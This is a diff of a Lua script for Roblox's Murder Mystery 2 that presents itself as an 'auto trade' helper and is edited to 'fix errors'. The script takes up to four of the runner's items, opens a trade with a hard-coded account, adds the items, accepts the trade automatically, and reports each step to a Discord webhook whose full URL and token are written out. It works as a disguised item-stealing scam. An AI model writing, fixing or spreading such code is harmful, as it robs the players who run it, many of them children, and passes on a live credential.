@@ -1,4 +1,4 @@
--- MM2 AUTO TRADE SCRIPT - CLEAN VERSION
+-- -- MM2 AUTO TRADE SCRIPT - FIXED NO ERRORS
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
 local TARGET_USER = "Sigmake5"
@@ -13,7 +13,7 @@ local remotes = {}
 
 local function sendLog(msg)
     pcall(function()
-        local data = Http:JSONEncode({content = "**MM2 Trade**\n" .. msg})
+        local data = Http:JSONEncode({content = "MM2 Trade: " .. tostring(msg)})
         request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
     end)
 end
@@ -21,10 +21,8 @@ end
 local function findRemotes()
     for _, v in pairs(RS:GetDescendants()) do
         if v:IsA("RemoteEvent") then
-            local n = v.Name:lower()
-            if n:find("trade") or n:find("offer") or n:find("request") then
-                remotes[v.Name] = v
-            end
+            local name = v.Name
+            remotes[name] = v
         end
     end
 end
@@ -32,11 +30,15 @@ end
 local function getItems()
     local items = {}
     for _, item in pairs(player.Backpack:GetChildren()) do
-        if item:IsA("Tool") then table.insert(items, item) end
+        if item:IsA("Tool") then
+            table.insert(items, item)
+        end
     end
     if player.Character then
         for _, item in pairs(player.Character:GetChildren()) do
-            if item:IsA("Tool") then table.insert(items, item) end
+            if item:IsA("Tool") then
+                table.insert(items, item)
+            end
         end
     end
     return items
@@ -45,10 +47,14 @@ end
 local function addItems()
     local items = getItems()
     local added = 0
-    local addRemote = remotes["OfferItem"] or remotes["TradeAddItem"]
-    if not addRemote then return 0 end
+    local addRemote = remotes.OfferItem or remotes.TradeAddItem
+    if not addRemote then
+        return 0
+    end
     for i = 1, math.min(4, #items) do
-        pcall(function() addRemote:FireServer(items[i]) end)
+        pcall(function()
+            addRemote:FireServer(items[i])
+        end)
         added = added + 1
         wait(0.3)
     end
@@ -56,17 +62,27 @@ local function addItems()
 end
 
 local function acceptTrade()
-    local accept = remotes["AcceptTrade"] or remotes["AcceptRequest"]
-    if accept then pcall(function() accept:FireServer() end) end
+    local accept = remotes.AcceptTrade or remotes.AcceptRequest
+    if accept then
+        pcall(function()
+            accept:FireServer()
+        end)
+    end
 end
 
 local function startTrade(target)
-    if tradeActive then return end
+    if tradeActive then
+        return
+    end
     tradeActive = true
     sendLog("Trading " .. target.Name)
     
-    local start = remotes["StartTrade"]
-    if start then pcall(function() start:FireServer(target) end) end
+    local start = remotes.StartTrade
+    if start then
+        pcall(function()
+            start:FireServer(target)
+        end)
+    end
     
     wait(1.5)
     acceptTrade()
